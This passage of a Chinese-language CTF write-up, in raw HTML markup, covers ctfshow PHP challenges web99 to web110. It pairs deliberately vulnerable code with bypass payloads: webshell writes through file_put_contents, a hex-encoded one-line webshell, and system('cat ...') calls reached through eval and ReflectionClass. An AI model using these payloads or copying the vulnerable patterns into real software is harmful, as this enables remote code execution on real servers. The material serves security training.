constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我们只需要，向flag参数传任意值，然后post传递参数HTTP_FLAG为flag即可。</p><h2 id="Web99"><a href="#Web99" class="headerlink" title="Web99"></a>Web99</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的主要点为in_array的对比时弱类型对比，所以我们可以用1.php进行对比。</p><p>所以，我们可以传入n=1.php content=<?php eval(system('cat flag36d.php');)?></p><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>。。。php有个神奇的特性=的优先级竟然高于and也就说，我们可以将v1传为1即可。;的绕过可以使用注释进行绕过。即v2=system(‘cat flag36d.php’)/<em>v3=</em>/;成功绕过。</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>反射类的使用</p><p>具体的讲解可见<a href="https://learnku.com/articles/37162">https://learnku.com/articles/37162</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload为<span class="token operator">?</span>v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"flag&#123;123123123&#125;"</span><span class="token punctuation">;</span>    <span class="token keyword">const</span>  <span class="token constant">PI</span><span class="token operator">=</span><span class="token number">3.14</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">getConstants</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// 输出类中常量</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 输出类名</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">getStaticProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 输出静态属性，以数组显示</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// 输出方法名以及内容，以数组显示</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>非预期结果：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">v2<span class="token operator">=</span>var_dumpv2<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web102-103"><a href="#web102-103" class="headerlink" title="web102,103"></a>web102,103</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先，is_numeric是可以识别16进制的，所以我们可以传入16进制数绕过v4。substr的意思为取第2的字符之后的字符串，所以取完之后s为一串16进制数。v1我们可以取hex2bin使其转换为字符串。这样我们就可以写入了一句话木马。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$a='&lt;?=`cat *`;';$b=base64_encode($a);  // PD89YGNhdCAqYDs=$c=bin2hex($b);      //这里直接用去掉=的base64输出   5044383959474e6864434171594473带e的话会被认为是科学计数法，可以通过is_numeric检测。大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'你还想要flag嘛？'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'既然你想要那给你吧！'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>你还想要flag嘛？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们自后向前分析。</p><p>我哦们可以通过$erro或者$suces来输出flag。只要使他们等于$flag即可。</p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>a<span class="token operator">=</span>flagpost<span class="token punctuation">:</span> erro<span class="token operator">=</span>a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以表示为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$flag</span><span class="token variable">$erro</span><span class="token operator">=</span><span class="token variable">$a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或者可以通过suces进行表示</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>a<span class="token operator">=</span>flagsuces<span class="token operator">=</span>a<span class="token operator">&amp;</span>flag<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$flag</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token variable">$a</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token constant">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$v1</span><span class="token operator">!=</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组绕过，或者科学计数法绕过。</p><pre class="line-numbers language-none"><code class="language-none">aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>parse_str — 将字符串解析成多个变量</p></blockquote><pre><code>parse_str ( string $encoded_string [, array &amp;$result ] ) : void如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。</code></pre><p>post：v3=1</p><p>v1=flag=c4ca4238a0b923820dcc509a6f75849b</p><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>           <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//只有36d的人才能看到flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                  <span class="token comment">// 这个函数使字符串翻转，比如从abc变成cba</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的考查点</p><p>ereg %00正则截断。</p><p>36d的10进制表示为877，所以我们取翻转之后的778。弱类型，强制类型转化。</p><p>payload c=a%00778</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题很简单，只需要使用我们上面提及的反射类即可。</p><p>payload：v1=ReflectionClass&amp;v2=system(%27cat%20f*%27)</p><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 